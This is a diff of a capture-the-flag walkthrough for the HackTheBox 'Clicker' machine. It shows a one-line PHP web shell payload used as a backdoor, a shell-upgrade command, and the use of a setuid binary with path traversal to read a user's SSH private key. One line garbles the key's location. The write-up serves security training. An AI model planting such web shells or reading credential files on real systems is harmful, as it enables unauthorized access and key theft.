@@ -244,6 +244,7 @@ header('Location: /admin.php?msg=Data has been saved in ' . $filename);
 - So if we add the `nickname` as parameter with one simple line of PHP code, we can create a backdoor:
 
 Payload:
+
 ```php
 <?php system($_GET['cmd']) ?>
 ```
@@ -326,17 +327,17 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 - We can analyze with **Ghidra** the binary `execute_query` in `/opt/manage/execute_query` to apply Reverse Engineering.
 
 ```
-jack@clicker:/opt/manage$ file execute_query
+www-data@clicker:/opt/manage$ file execute_query
 execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped
 ```
 
-
-- First transfer the file via SSH to our attacker's machine:
+- First we need to download the file `execute_query` to our attacker's machine:
 
 ```bash
-# From our local machine execute:
-scp -i id_rsa jack@clicker.htb:/opt/manage/execute_query /home/hackermater/HTB/Machines/Clicker/content/Ghidra
+www-data@clicker:/opt/manage$ cp execute_query /var/www/clicker.htb/exports
 ```
+
+- And after that, go to `http://clicker.htb/exports/execute_query` to download the binary.
 
 ### Ghidra
 
@@ -462,7 +463,7 @@ $: ./execute_query 4
 - So probably if we try with execute `execute_query` with any number *(**int** or **float**)* like 5 or 6.2415 or 555.01, etc..., as argument and then the file which we want read, we can read the `id_rsa` file of Jack user that is in `/etc/passwd`.
 
 ```bash
-jack@clicker:/opt/manage$ ./execute_query 5.2 ../.ssh/id_rsa
+www-data@clicker:/opt/manage$ ./execute_query 5.2 ../.ssh/id_rsa
 ```
 
 - This works because the PATH where is executed the binary is from `/home/jack/queries`
